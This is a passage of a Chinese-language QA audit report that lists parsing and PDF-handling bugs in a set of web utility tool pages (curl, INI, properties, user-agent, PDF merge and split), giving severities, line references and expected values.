- **curl-parser**：`-d`→POST、选项值消费、输出转义已修到位；末行续行 `\` 被当 URL（IT-D31）、`--data-urlencode` 不编码（IT-D37）、双引号内 `\"` 未反转义（IT-D38）。
- **plist-parser**：XML 真解析，dict/array/integer/real/bool 正确；`data`、`date` 原样返回（既有）。
- **user-agent-parser**：Chrome/Safari/Edge/Firefox/Googlebot 正确；微信 UA 归为 Chrome、CriOS/FxiOS 归「未知」（IT-D41 / 既有 IT-N65）。

### 问题清单（新增）

| 编号 | 页面:行 | 级别 | 问题与期望值 |
|---|---|---|---|
| IT-D31 | `tools/it/curl-parser.html:339` | 高 | URL 位于末行且上游用 `\` 续行时，`\` 被当作 URL：实测 `url:"\\"`，期望 `https://api.example.com/users`（node 复刻分词与主循环） |
| IT-D32 | `tools/office/pdf-merge.html:512,703` | 高 | `loadPageCount` 用 `ignoreEncryption` 使加密文件列为可用；`copyPages` 不解密 → 整体抛错或输出空白，与 `:349,:391`「跳过并提示、不影响其余」矛盾。期望单文件标 error 后 `continue`（node 加载同版本 pdf-lib：正常 2+3 页合并成功，`copyPages` 无加密检查） |
| IT-D33 | `tools/it/properties-parser.html:258,298` | 高 | 只按 `\n` 切行，CRLF 的 `\r` 留在值尾：`a=b\r\nc=d\r\n` → `{"a":"b\r","c":"d\r"}`，期望 `"b"/"d"`（node 复刻 `parseProps`） |
| IT-D34 | `tools/office/pdf-split.html:568,455-466` | 假 | 宣称「拆分 PDF 为多个小文件」「段数=ceil(总页数/每段页数)」「文件数=段数」，实际无「每段页数」输入且只产出 1 个 PDF |
| IT-D35 | `tools/office/pdf-split.html:907` | 中 | 强制 `sort` 升序：`7-10,1` → `[1,7,8,9,10]`，与 `:480,:519`「按填写顺序」矛盾（pdf-lib 本身保序） |
| IT-D36 | `tools/office/pdf-split.html:1170` | 中 | 历史记录回填后直接调 `downloadResult()`：有缓存则莫名下载，无缓存弹「开始下载」错误提示 |
| IT-D37 | `tools/it/curl-parser.html:257,173` | 中 | `--data-urlencode` 映射为普通 data、不做编码：`q=a b` 期望 `q=a%20b`（页面表格自述 percent-encodes） |
| IT-D38 | `tools/it/curl-parser.html:357` | 中 | `trimQuote` 只剥外层引号，双引号内 `\"` 未反转义：data 为 `{\"name\":\"a\"}`，期望 `{"name":"a"}` |
| IT-D39 | `tools/it/ini-parser.html:275` | 中 | 只认 `=`：`[s]` + `host: localhost` → `{}`，期望 `{"s":{"host":"localhost"}}`（页面称「= 或 : 分隔」） |
| IT-D40 | `tools/it/ini-parser.html:275` | 中 | 无值键整行丢弃：`[s]` + `flag` → `{}`，期望 `{"s":{"flag":""}}` |
| IT-D41 | `tools/it/user-agent-parser.html:316` | 中 | 微信 UA（`MicroMessenger/8.0.40 … Chrome/116`）判为 `Chrome 116`，无微信规则；`Baiduspider` 浏览器为「未知」（设备已判爬虫） |

### 统计

- 页数 **9**（PDF 4 + 解析 5）；独立实现 **6** / 共享实现 **3**。
- 新增 **11** 条（高 **3** / 中 **7** / 假 **1** / 安全 **0**）；编号 IT-D31–IT-D41。
- 复核既有 6 条（`it.md:2582`、`:2588`、`:2593`、`:140`、`:141`、IT-N65）均仍成立；确认 IT-N10（空格成键）、IT-N14（`-d` 漏判 POST/选项吞 URL/头部 XSS）、IT-N24（重复节丢键）已修。
- 复算方式：按页面函数逐行复刻 node 桩（properties/ini/curl/UA）；PDF 用同版本 pdf-lib 真调用；未开浏览器、未跑 `_build.py`/门禁、未改仓库文件。



